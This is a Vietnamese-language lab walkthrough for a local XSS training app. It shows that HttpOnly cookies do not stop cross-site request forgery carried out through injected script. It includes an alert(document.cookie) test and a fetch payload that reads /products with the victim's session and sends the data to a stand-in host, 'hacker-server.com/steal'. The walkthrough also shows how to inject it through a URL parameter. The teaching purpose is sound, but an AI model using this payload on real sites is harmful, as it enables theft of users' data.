# Scenario 02: Silent Cookie Miner (XSS)

## 🎯 Mục tiêu
Sử dụng lỗ hổng XSS để thực hiện các hành động trái phép thay mặt người dùng, ngay cả khi không thể ăn trộm được Cookie (nhờ HttpOnly).

## 🛠️ Công cụ
- Trang web mục tiêu: `localhost:3000/lab/xss`.
- Payload XSS (Javascript).

## 🚀 Các bước thực hiện

### 1. Kiểm chứng HttpOnly
- Truy cập `/lab/xss`.
- Thử chèn payload: `<script>alert(document.cookie)</script>`.
- **Kết quả:** Bạn sẽ thấy Cookie `__Host-refresh_token` KHÔNG xuất hiện. Đây là thành quả của HttpOnly!

### 2. Tấn công Request Forgery qua XSS
Vì trình duyệt vẫn tự động đính kèm Cookie khi gửi request đến cùng domain, chúng ta có thể dùng JS để "ép" trình duyệt gửi request lấy dữ liệu nhạy cảm.

**Payload:**
```javascript
fetch('http://localhost:3001/products')
  .then(res => res.json())
  .then(data => {
    // Gửi dữ liệu nhạy cảm về server của hacker
    fetch('http://hacker-server.com/steal?data=' + JSON.stringify(data))
  });
```

### 3. Thực hành
Chèn payload trên vào tham số `name` trên URL:
`?name=<script>fetch(...) </script>`

## 💡 Tại sao kịch bản này quan trọng?
Nhiều người lầm tưởng HttpOnly là "vạn năng". Thực tế, nó chỉ chống được việc **ăn trộm** cookie, chứ không chống được việc **sử dụng** cookie trái phép qua XSS.

---
**Payload mẫu:** Xem tại `scripts/exploit/payloads/xss.js`.
